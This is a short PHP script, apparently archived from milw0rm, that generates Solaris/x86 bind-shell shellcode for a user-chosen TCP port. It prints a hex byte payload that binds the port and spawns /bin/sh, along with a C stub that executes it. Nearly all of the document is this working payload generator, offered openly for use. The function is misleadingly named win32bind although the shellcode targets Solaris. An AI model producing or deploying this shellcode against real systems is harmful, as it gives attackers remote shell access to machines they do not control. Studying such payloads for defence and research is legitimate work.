<html><head><title>solaris/x86 portbind/tcp shellcode generator </title></head><pre>&lt;?php
/*
Utility	: Solaris/x86 - Generate PortBind/TCP shellcode
Author	: Jonathan Salwan
Mail	: submit [!] shell-storm.org

	More shellcodes in =&gt; http://www.shell-storm.org/shellcode/
*/

function syntax()
	{
	echo &quot;\nSyntax:\nroot@laptop:/# php ./payload.php &lt;port&gt;\n\n&quot;;
	}

function win32bind($port)
		{
		if($port &gt; 65535 || $port &lt; 4100){
			echo &quot;Erreur Port\nSelect a port between 4100 and 65535\n&quot;;
			return false;
			}

		$inser .= &quot;\nchar shellcode[] = \n&quot;;
		$inser .= &quot;			/* BindPort TCP/$port; Os:Solaris; Gen:http://payload.shell-storm.org */\n&quot;;
		$inser .= &quot;\n&quot;;

		$inser .= &quot;			\x22\\xb8\\xff\\xf8\\xff\\x3c\\xf7\\xd0\\x50\\x31\\xc0\\xb0\\x9a\\x50\\x89\\xe5\\x31\\xc9\x22\n&quot;;
		$inser .= &quot;			\x22\\x51\\x41\\x41\\x51\\x51\\xb0\\xe6\\xff\\xd5\\x31\\xd2\\x89\\xc7\\x52\\x66\\x68\x22\n&quot;;
		$inser .= &quot;			\x22\\x&quot;;

		$res_port 	= base_convert($port, 10, 16);

		$length 	= strlen($res_port)-1;
		$i 		= 1;

		for($idx = 0; $idx &lt; $length+1; $idx++)
		{
		$i++;
		if($i == 4)		
		$inser .= &quot;\\x&quot;;

		$inser .= $res_port[$idx];
		}
		$inser .= &quot;\x22 /* Port &quot;.$port.&quot; */\n&quot;;
		$inser .= &quot;			\x22\\x66\\x51\\x89\\xe6\\x6a\\x10\\x56\\x57\\xb0\\xe8\\xff\\xd5\\xb0\\xe9\\xff\\xd5\x22\n&quot;;
		$inser .= &quot;			\x22\\x50\\x50\\x57\\xb0\\xea\\xff\\xd5\\x31\\xd2\\xb2\\x09\\x51\\x52\\x50\\xb0\\x3e\x22\n&quot;;
		$inser .= &quot;			\x22\\xff\\xd5\\x49\\x79\\xf2\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\x22\n&quot;;
		$inser .= &quot;			\x22\\x89\\xe3\\x50\\x53\\x89\\xe2\\x50\\x52\\x53\\xb0\\x3b\\xff\\xd5\x22\x3b\n&quot;;
		$inser .= &quot;\n&quot;;
		$inser .= &quot;	printf(\x22Length: %d\\n\x22,strlen(shellcode));\n&quot;;
		$inser .= &quot;	(*(void(*)()) shellcode)();&lt;/br&gt;&quot;;
		$inser .= &quot;\n&quot;;
		$inser .= &quot;\n&quot;;

	return $inser;
}

if($argc &lt; 2){
	syntax();
	return false;
	}
		$port = $argv[1];
		echo win32bind($port);

?&gt;

# milw0rm.com [2009-06-16]</pre></html>